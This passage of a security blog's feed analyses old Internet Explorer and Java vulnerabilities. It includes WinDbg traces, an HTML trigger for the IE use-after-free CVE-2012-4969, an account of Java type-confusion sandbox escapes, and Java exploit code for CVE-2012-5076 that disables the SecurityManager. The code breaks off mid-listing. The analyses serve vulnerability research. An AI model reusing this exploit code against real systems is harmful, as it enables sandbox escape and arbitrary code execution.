<p>b) 继续执行到document.write(“x”)时，会触发断点mshtml!CMshtmlEd::~CMshtmlEd，观察析构函数中esi为CMshtmlEd对象的地址，而esi的值恰好是a)中申请的对象地址，此处即为release的位置；<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="number">eax</span>=<span class="number">00000000</span> <span class="number">ebx</span>=075e8f8c <span class="number">ecx</span>=<span class="number">00000001</span> <span class="number">edx</span>=075e8f8c <span class="literal">esi</span>=07adaf78 <span class="literal">edi</span>=<span class="number">00000001</span> //07adaf78正好等于上面申请的对象地址</span><br><span class="line"><span class="literal">eip</span>=6375bf32 <span class="literal">esp</span>=038d827c <span class="literal">ebp</span>=038d8284 iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CMshtmlEd::~CMshtmlEd:</span><br><span class="line">6375bf32 8b460c          <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">0Ch</span>] <span class="literal">ds</span>:<span class="number">0023</span>:07adaf84=07adcfc0</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; u <span class="literal">eip</span></span><br><span class="line">mshtml!CMshtmlEd::~CMshtmlEd:</span><br><span class="line">6375bf32 8b460c          <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">0Ch</span>]</span><br><span class="line">6375bf35 <span class="number">57</span>              <span class="keyword">push</span>    <span class="literal">edi</span></span><br><span class="line">6375bf36 c706a49e6363    <span class="keyword">mov</span>     <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>],offset mshtml!CMshtmlEd::<span class="string">`vftable' (63639ea4) //esi即为this指针</span><br><span class="line">6375bf3c e88e06eeff      call    mshtml!ReleaseInterface (6363c5cf)</span></span><br></pre></td></tr></table></figure></p>
<p>c) 继续运行，当返回到函数CMshtmlEd::Exec中时将触发访问异常，即为函数的crash点；通过之前的静态分析知道edi为CMshtmlEd对象的地址，观察其值07adaf78就是b)中释放的对象地址，而这里再次使用了这个地址导致crash，此处即为reuse的位置。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line">(<span class="number">828.</span>6fc): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="number">eax</span>=<span class="number">00000000</span> <span class="number">ebx</span>=0000001f <span class="number">ecx</span>=075e8f30 <span class="number">edx</span>=<span class="number">0000000d</span> <span class="literal">esi</span>=<span class="number">00000000</span> <span class="literal">edi</span>=07adaf78 //<span class="literal">edi</span>的值即为之前释放的对象地址</span><br><span class="line"><span class="literal">eip</span>=637d464b <span class="literal">esp</span>=038dbe80 <span class="literal">ebp</span>=038dbe8c iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">mshtml!CMshtmlEd::Exec+<span class="number">0x131</span>:</span><br><span class="line">637d464b 8b7f08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>+<span class="number">8</span>] <span class="literal">ds</span>:<span class="number">0023</span>:07adaf80=????????</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞触发POC">漏洞触发POC</h2><p>根据上文的分析可知：</p>
<ol>
<li>当执行document.execCommand(“selectAll”)时，会创建CMshtmlEd对象，并调用该对象的Exec函数</li>
<li>当执行document.write(“x”)时，之前创建的CMshtmlEd对象会被释放</li>
<li>继续执行回到Exec函数时，会访问CMshtmlEd对象的成员，从而导致释放后重用</li>
</ol>
<p>漏洞的利用方式也是用HeapSpray+ROP来实现，具体的利用细节待以后分析。触发漏洞的POC代码如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">HTML</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="openscad"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcB</span><span class="params">()</span> &#123;</span></span><br><span class="line">      alert<span class="params">(<span class="string">"enter func B"</span>)</span>;</span><br><span class="line">      document.execCommand<span class="params">(<span class="string">"selectAll"</span>)</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcA</span><span class="params">()</span> &#123;</span></span><br><span class="line">      alert<span class="params">(<span class="string">"enter func A"</span>)</span>;</span><br><span class="line">      document.write<span class="params">(<span class="string">"x"</span>)</span>;</span><br><span class="line">      parent.arr[<span class="number">0</span>].src = <span class="string">"YMjf\u0c08\u0c0cKDogjsiIejengNEkoPDjfiJDIWUAzdfghjAAuUFGGBSIPPPUDFJKSOQJGH"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">body</span> <span class="attribute">onload</span>=<span class="value">'funcB();'</span> <span class="attribute">onselect</span>=<span class="value">'funcA()'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">contenteditable</span>=<span class="value">'true'</span>&gt;</span>a<span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>UAF(Use After Free)漏洞是众多IE漏洞中最经典的一类，本文将通过分析CVE-2012-4969来揭开UAF的面纱。]]>
    
    </summary>
    
      <category term="IE CVE" scheme="https://github.com/liteway/liteway.github.io/tags/IE-CVE/"/>
    
      <category term="UAF" scheme="https://github.com/liteway/liteway.github.io/tags/UAF/"/>
    
      <category term="漏洞分析" scheme="https://github.com/liteway/liteway.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Watching Type Confusion Attacks from Java Exploits]]></title>
    <link href="https://github.com/liteway/liteway.github.io/2014/11/30/java_exploit_type_confusion/"/>
    <id>https://github.com/liteway/liteway.github.io/2014/11/30/java_exploit_type_confusion/</id>
    <published>2014-11-29T16:01:01.000Z</published>
    <updated>2015-08-08T08:48:46.000Z</updated>
    <content type="html"><![CDATA[<p>本文通过几个典型的Java CVE来分析几种不同的类型混淆攻击手法。由于之前写的是英文的，这里就没有再翻译为中文。<a id="more"></a></p>
<p>In recent years, Java has become a favorite target for attackers because of its huge user base and platform independence. In the common 4 categories of Java vulnerabilities (include type confusion, logic error, memory corruption and argument injection), type confusion attack is the most popular one, and this type of exploit is also widely used by some famous EKs (Exploit Kits) in the latest three years. According to the article (link: Exploit Kit Landscape of 2014), the CVE-2012-0507, a typical type confusion attack, is still active in Nuclear EK and Fiesta EK.</p>
<h2 id="Concept_of_Type_Confusion">Concept of Type Confusion</h2><p>An object’s type defines its behaviors, and a program can’t perform an operation on an object unless the object’s type defines it. The type for an object is just like the identity for one person, if the identity is stolen by an attacker, then the attacker can exploit it to access the person’s resources, similar to this, the confused object can perform the stolen type’s operations.<br>In general, type confusion means an illegal type conversion. Such as the following example, once TYPE_B is confused to TYPE_A successfully, then we can use the returned object b to call the TYPE_A’s methods, and can access the TYPE_A’s memory, that may lead to exploitation.<br><img src="/img/java_exploit_type_confusion/1.jpg" alt=""><br>Type safety is the most essential element of Java security, the Java language is designed to guarantee type safety, and it all depends on static type checking of the byte code verifier at compile time. Although the byte code verifier is an effective checker for type safety, there are some type confusion methods that can bypass Java type checking. </p>
<h2 id="Type_Confusion_Attacks_in_Java">Type Confusion Attacks in Java</h2><p>In the Java sandbox model, SecurityManager and ClassLoader are the critical types, anyone of them is confused to the crafted type that an attacker can control, which may result in Java sandbox is broken. From the perspective of confusion targets, the following will present two different kinds of type confusion attacks.</p>
<h2 id="ClassLoader_Confusion_Attack">ClassLoader Confusion Attack</h2><p>In the Java security infrastructure, class loader plays a very important role. The JVM (Java Virtual Machine) uses different class loaders to load classes from different sources, and assigns different permissions, which can isolate credible classes from evil classes. However if a crafted class loader from attacker is confused to a privileged class loader that JVM trusted, then the crafted class loader can do whatever the privileged class loader does, and this is a typical class loader confusion attack. Here we will introduce two different methods to achieve this attack with the cases CVE-2012-0507 and CVE-2012-1723.</p>
<h3 id="CVE-2012-0507_(API_Level_Confusion)">CVE-2012-0507 (API Level Confusion)</h3><p>The exploit of CVE-2012-0507 is a very typical case of type confusion attack, it confuses user defined class loader to applet class loader through Java API vulnerability. This vulnerability exists in the java.util.concurrent.atomic.AtomicReferenceArray class, the Object[] member variable allows to store any array, meanwhile the set(int i, E newValue) member method which includes the putObjectVolatile(Object o, long offset, Object x) native method implemented in sun.misc.Unsafe class, can store any type of object into the inner array without safety check. Therefore, if we can store an array A[] to the Object[], and set B as the member of A[], and then get it out as type A, now we confuse type A to type B successfully. According to this way, below we will analyze the major exploit process.</p>
<p>a)  Construct AtomicReferenceArray<br>In this case, we use Help[] as the array which will store to the private Object[] member of AtomicReferenceArray, but it doesn’t permit to set the private member by reflection in applet context. Because the AtomicReferenceArray is serializable, so we can serialize Help[] and AtomicReferenceArray to an assistant array object named arrayOfObject, then deserialize and get them out with original types. The following code shows this process.<br><img src="/img/java_exploit_type_confusion/2.0.jpg" alt=""><br>After this construction process, the arrayOfObject’s structure layout is like the following figure, arrayOfObject[0] is Help[], arrayOfObject[1] is crafted AtomicReferenceArray, the private Object[] member of AtomicReferenceArray is the reference of arrayOfObject[0].<br><img src="/img/java_exploit_type_confusion/2.1.png" alt=""></p>
<p>b)  Confuse ClassLoader<br>After get the crafted arrayOfObject, the vulnerable set method of AtomicReferenceArray can help to store localClassLoader into the array member without safety check, the immediate effect is that localClassLoader becomes the member of Help[], we can get localClassLoader out with Help type, then the localHelp is confused to localClassLoader.<br><img src="/img/java_exploit_type_confusion/2.2.jpg" alt=""><br>The Help is a serializble class that extends from ClassLoader, and we pass the confused Help object whose real type is localClassLoader to the static doWork method, then we can operate the real localClassLoader in this method.<br><img src="/img/java_exploit_type_confusion/2.3.jpg" alt=""></p>
<p>c)  Construct ProtectionDomain<br>While class loader loads a class to JVM, the relevant protection domain will be created and linked to the class. Protection domain is a set of permissions and code sources, and it decides code’s running limits in Java sandbox. Once a class’s protection domain is set to all permissions, the class can do any privileged operation. The code of creating protection domain with all permissions is as follows.<br><img src="/img/java_exploit_type_confusion/2.4.jpg" alt=""><br>For preparing a class to link to the protection domain of all permissions, we create a payload class named MyPayload and convert its content to a byte array, and we can deploy some attacking behaviors in the payload class.<br><img src="/img/java_exploit_type_confusion/2.5.jpg" alt=""></p>
<p>d)  Trigger Exploit<br>After that, the real effective confusion occurs in the defineClass method of ClassLoader. The defineClass method is the key to load a class, and we can’t access from outside because it’s a protected member method, but in the Help class which extends from ClassLoader, that will not be a problem. However, the Help class, a user defined ClassLoader, has no permission to instantiate class, but for the instantiated localClassLoader, it’s legitimate to call defineClass method.<br>In the following code, the paramHelp object that has been confused is actually the reference of localClassLoader, therefore when we call the following paramHelp.defineClass, we actually use current applet class loader to load our payload class with all permissions. Once the localClass.newInstance method is executed, the attacking behaviors in MyPayload class will be performed successfully.<br><img src="/img/java_exploit_type_confusion/2.6.jpg" alt=""></p>
<p>In summary, the root cause of CVE-2012-0507 is that the set method in AtomicReferenceArray allows the array member to store any type of object without type checking, and eventually lead to type confusion attack for class loader. </p>
<h3 id="CVE-2012-1723_(Instruction_Level_Confusion)">CVE-2012-1723 (Instruction Level Confusion)</h3><p>Be similar to CVE-2012-0507, the exploit of CVE-2012-1723 also confuses custom class loader to applet class loader, and then loads evil class through abusing defineClass method. Different from CVE-2012-0507’s type confusion in API level, it confuses type in instruction level. The vulnerability occurs in the verification phase for methods JIT(Just In Time) compiled, the field access instructions (GETSTATIC/PUTSTATIC/GETFIELD/PUTFIELD) can be abused to confuse static field and nonstatic filed. The main exploit process is as follows.</p>
<p>a)  Defer Method Verification<br>In consideration of performance, JVM usually compiles some hot code (commonly executed method or loop code block) to native machine code with JIT compilation at runtime, and the byte code verification for hot methods also will be deferred to runtime. We put the confuse method in a large loop, and call the method with null argument to ensure the real confusion instructions can’t be executed, then the confuse method will be JIT compiled, meanwhile the method verification will be deferred.<br><img src="/img/java_exploit_type_confusion/3.0.jpg" alt=""></p>
<p>b)  Confuse Field<br>For JIT method, the tactic of field verification is that if two field access instructions refer to the same field in a method, the field is only verified once and the result will be cached. Once the verification information of first field instruction is cached, the verification couldn’t be done when invoking second field instruction. Because we have no permission to instantiate a ClassLoader class, so we choose GETSTATIC and PUTFIELD to confuse a static ClassLoader to an instance field.<br><img src="/img/java_exploit_type_confusion/3.1.jpg" alt=""><br>In the code above, the staticTypeA, whose type is ClassLoader, is a static field of Confuser class. We tamper the byte code of confuse method, adding getstatic and pop in front that will make the verification information for staticTypeA cached without affecting the subsequent execution flow, and then changing original putstatic to putfield that will make JVM write the staticTypeA into one of instance fields in Confuser class. Now that the static field located in method area is confused to an instance field located in current heap.</p>
<p>c)  Search Target Field<br>Before tampering the byte code of confuse method, we need to deploy some instance fields in Confuser class as search domain. The type of instance fields is ConfusingClassLoader which is a user defined ClassLoader. If one of instance fields is matched, the paramClassLoader will be returned as ConfusingClassLoader type. The Confuser class is as follows.<br><img src="/img/java_exploit_type_confusion/3.2.jpg" alt=""></p>
<p>d)  Trigger Exploit<br>The triggering process is similar with CVE-2012-0507. In the following code, c1 is the confused applet class loader, and then call c1.defineClass to load an evil class with all permissions in the static method of ConfusingClassLoader class.<br><img src="/img/java_exploit_type_confusion/3.3.jpg" alt=""><br>Comparing with CVE-2012-0507, this vulnerability is more subtle, and the type confusion method is more skillful. But all the same, both of the two exploits are taking applet class loader as confused target, and then load evil classes to perform arbitrary code.</p>
<h2 id="System_Class_Confusion_Attack">System Class Confusion Attack</h2><p>The security manager is the core of Java sandbox, it will be awoken to check permissions when some unsafe operations try to execute. However once the security manager is set to null, the following security check could not be performed, and many Java exploits disable security manager and bypass Java sandbox in this way. For Java applet, the static SecurityManager object in java.lang.System class is set to AppletSecurity by default, if we can confuse user defined class to System class, and control the memory of System class, then directly set SecurityManager object in the memory to null, and the exploit of CVE-2013-2423 is using this attack method.</p>
<h3 id="CVE-2013-2423">CVE-2013-2423</h3><p>This vulnerability exists in the reflection API of Java 7, the findStaticSetter method can be used to tamper with any field of value. The exploit abuses findStaticSetter to tamper with the TYPE fields of Integer and Double class, then utilizes the difference of type size to confuse crafted class to System class, and the detail exploit process is as follows.</p>
<p>a)  Craft Assistant Classes<br>In order to confuse System class, we first need to craft 3 assistant classes: Union1, Union2 and SystemClass. The SystemClass as confusion class includes some objects that is used for searching SecurityManager object in memory. The structures of these classes are like the following figure.<br><img src="/img/java_exploit_type_confusion/4.0.jpg" alt=""></p>
<p>b)  Confuse System Class<br>For each Java basic type, there is a corresponding type class, such as java.lang.Integer, java.lang.Double, and the TYPE field of type class decides the type of a variable and the size of allocated space. In 32 bit JVM, the int type is 4 bytes, the double type is 8 bytes, we can confuse the size of basic type by using the vulnerable findStaticSetter method to tamper with the TYPE fields of Integer and Double. As the following code, the findStaticSetter method is used to create a method handle for setting static TYPE field, and save the original TYPE field for recovering afterward, then set Double.TYPE to Integer.TYPE while set Integer.TYPE to null, and now JVM will take int type as double type, and operate it with 8 bytes.<br><img src="/img/java_exploit_type_confusion/4.1.jpg" alt=""><br>After confusing Integer and Double, we set the field2 of Union1 to the real System.class, and get the field1 of Union1 which will lead to read 8 bytes from memory, and then when we write the 8 bytes’ data to the field1 of Union2, it will override the point of SystemClass with the point of real System.class, and now that the System.class is confused to our crafted SystemClass. The confused memory layout is like following figure.<br><img src="/img/java_exploit_type_confusion/4.2.png" alt=""></p>
<p>c)  Disable Security Manager<br>After confused successfully, we can find the static SecurityManager member of System class by matching objects of SystemClass, and then set the matched object to null. And now that the security manager of current applet is disabled, we can do any unsafe operation.<br><img src="/img/java_exploit_type_confusion/4.3.jpg" alt=""></p>
<p>In summary, type confusion breaks down the barrier of accessing memory, let illegal objects enter into restricted area and tamper with critical data, and finally lead security system to be compromised. In Java exploits of recent years, type confusion attacks occupy an import position, we can pay more attention to type safety, so as to protect system better.</p>
<p>Reference:<br>[1] <a href="http://www.securingjava.com/chapter-two/chapter-two-10.html" target="_blank" rel="external">http://www.securingjava.com/chapter-two/chapter-two-10.html</a><br>[2] <a href="http://schierlm.users.sourceforge.net/TypeConfusion.html" target="_blank" rel="external">http://schierlm.users.sourceforge.net/TypeConfusion.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文通过几个典型的Java CVE来分析几种不同的类型混淆攻击手法。由于之前写的是英文的，这里就没有再翻译为中文。]]>
    
    </summary>
    
      <category term="Java CVE" scheme="https://github.com/liteway/liteway.github.io/tags/Java-CVE/"/>
    
      <category term="漏洞分析" scheme="https://github.com/liteway/liteway.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java Exploit分析之CVE-2012-5076]]></title>
    <link href="https://github.com/liteway/liteway.github.io/2014/09/18/java_cve_2012_5076/"/>
    <id>https://github.com/liteway/liteway.github.io/2014/09/18/java_cve_2012_5076/</id>
    <published>2014-09-17T16:01:01.000Z</published>
    <updated>2015-08-08T08:47:29.000Z</updated>
    <content type="html"><![CDATA[<p>CVE-2012-5076一个是Java API层的漏洞，通过利用缺陷API间接调用Bootstrap Classloader来加载自定义的提权类，从而绕过JRE Sandbox的限制。该漏洞影响范围是JRE7U0-JRE7U7。<a id="more"></a></p>
<p>CVE-2012-5076和CVE-2012-4681都是API层的漏洞，都是通过将SecurityManager置空来达到绕过Sandbox的目的。但不同的是，CVE-2012-4681通过构造一个可以执行setSecurityManager操作的上下文(具有AllPermission的AccessControlContext对象)，而CVE-2012-5076则是利用Bootstrap Classloader的特权来加载自定义的提权类，在提权类中执行setSecurityManager的操作。</p>
<h2 id="缺陷API">缺陷API</h2><p>该漏洞涉及的缺陷API有3个：</p>
<ul>
<li>com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory</li>
<li>com.sun.org.glassfish.gmbal.util.GenericConstructor</li>
<li>sun.invoke.anon.AnonymousClassLoader</li>
</ul>
<ol>
<li><p>我们攻击的目标就是AnonymousClassLoader类中的loadClass方法，它会调用sun.misc.Unsafe类中的defineClass方法，该方法会以Bootstrap Classloader来加载任意的类，而Bootstrap Classloader加载的类在JVM中会认为是可信的。因此，我们可以自定义一个提权类，在该类中执行置空SecurityManager的操作，从而越过安全检查。</p>
</li>
<li><p>sun包中的类是禁止直接访问的，我们需要通过辅助的API来间接访问AnonymousClassLoader类。ManagedObjectManagerFactory类中的getMethod方法可以用来获取loadClass方法对象，而GenericConstructor类中的create方法可以用来创建AnonymousClassLoader类的实例，在该实例上调用loadClass方法来加载并运行提权类中的操作，JRE Sandbox即被攻破。</p>
</li>
</ol>
<h2 id="详细利用分析">详细利用分析</h2><h3 id="1-_构造提权类">1. 构造提权类</h3><p>提权类MyPayload继承自PrivilegedExceptionAction类，在doPrivileged方法中实现特权操作-执行run方法来置空SecurityManager。MyPayload.java代码如下：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.AccessController;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.PrivilegedActionException;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.PrivilegedExceptionAction;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPayload</span> <span class="keyword">implements</span> <span class="title">PrivilegedExceptionAction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> MyPayload() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      AccessController.doPrivileged(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(PrivilegedActionException pae)&#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object run() throws Exception &#123;</span><br><span class="line">    System.setSecurityManager(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但MyPayload要想在JRE Sandbox中运行，必须用Bootstrap Classloader来加载，下面我们就要找到能间接调用Bootstrap Classloader的缺陷API。</p>
<h3 id="2-_如何加载提权类">2. 如何加载提权类</h3><p>从openjdk源码中可以发现，sun.invoke.anon.AnonymousClassLoader类的loadClass方法调用了fakeLoadClass方法，fakeLoadClass中又调用了unsafe.defineClass方法，unsafe为sun.misc.Unsafe类的实例，defineClass()为一个native方法，可以不经过安全检查而直接调用最顶层的Bootstrap Classloader加载任意类。<br>loadClass方法接收一个byte数组作为参数，我们首先要将提权类编译成字节码，并转化为byte数组：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ByteArrayOutputStream outStream =<span class="instruction"> new </span>ByteArrayOutputStream(<span class="function">)</span>;</span><br><span class="line">byte<span class="keyword">[</span>] bArr =<span class="instruction"> new </span>byte<span class="keyword">[</span>8192];</span><br><span class="line">InputStream inStream =<span class="function"> getClass(</span><span class="function">)</span>.getResourceAsStream(<span class="string">"MyPayload.class"</span><span class="function">)</span>;<span class="instruction"></span><br><span class="line">int </span>len = -1;</span><br><span class="line">while((len=inStream.read(bArr<span class="function">)</span><span class="function">)</span> &gt; 0<span class="function">)</span>&#123;</span><br><span class="line"> <span class="function"> outStream.write(</span>bArr, 0, len<span class="function">)</span>;</span><br><span class="line">&#125;</span><br><span class="line">//bArr is MyPayload class byte<span class="instruction"> array</span><br><span class="line"></span>bArr =<span class="function"> outStream.toByteArray(</span><span class="function">)</span>;</span><br></pre></td></tr></table></figure></p>
<p>根据JRE的包访问策略，sun包是限制访问的，所以目前的问题是如何构造AnonymousClassLoader对象，然后调用实例方法loadClass()。</p>
<h3 id="3-_生成AnonymousClassLoader对象">3. 生成AnonymousClassLoader对象</h3><p>在com.sun.org.glassfish.gmbal.util.GenericConstructor类中，create方法调用反射方法constructor.newInstance()来生成任意类的实例。我们可以利用create方法来构造AnonymousClassLoader的实例：<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GenericConstructor gc = <span class="keyword">new</span> GenericConstructor(<span class="built_in">Object</span>.<span class="keyword">class</span>, <span class="string">"sun.invoke.anon.AnonymousClassLoader"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">Object</span> obj = gc.create(<span class="keyword">new</span> <span class="built_in">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p>
<h3 id="4-_调用loadClass方法">4. 调用loadClass方法</h3><p>在#3中生成了AnonymousClassLoader对象后，我们需要调用该对象的loadClass方法，而该方法不能直接调用。com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory类中的反射方法getMethod()可以帮助我们达到这个目的，getMethod在doPrivileged块中调用getDeclaredMethod()，它可以用来获取任意方法对象。<br>我们借助getMethod方法来得到loadClass方法对象，加载MyPayload提权类，反射调用newInstance方法来实例化该提权类，提权类中的run()方法自动运行，SecurityManager被置为null，JRE Sandbox即被攻破。<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Method</span> <span class="title">md</span> = <span class="title">ManagedObjectManagerFactory</span>.<span class="title">getMethod</span><span class="params">(obj.getClass()</span>, "<span class="title">loadClass</span>", <span class="title">new</span> <span class="title">Class</span>[]<span class="comment">&#123;new byte[0].getClass()&#125;</span>);</span></span><br><span class="line"><span class="comment">//cls is MyPayload class object</span></span><br><span class="line"><span class="keyword">Class</span> cls = (<span class="keyword">Class</span>)md.invoke(obj, <span class="keyword">new</span> Object[]<span class="comment">&#123;bArr&#125;</span>);</span><br><span class="line"><span class="comment">//instance MyPayload class to set SecurityManager=null</span></span><br><span class="line">cls.newInstance();</span><br></pre></td></tr></table></figure></p>
<h3 id="5-_POC参考代码">5. POC参考代码</h3><p>CVE-2012-5076的Exploit代码（参考Metasploit）：<br>MyPayload.java参考#1中描述，Exploit.java代码如下：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.applet.Applet;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.glassfish.gmbal.util.GenericConstructor;</span><br><span class="line"></span><br><span class="line"><span class="comment">//CVE-2012-5076</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exploit <span class="keyword">extends</span> Applet &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> init()&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.disableSecurity();</span><br><span class="line">      <span class="keyword">this</span>.setPayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable t)&#123;</span><br><span class="line">      t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> disableSecurity() &#123;</span><br><span class="line">    <span 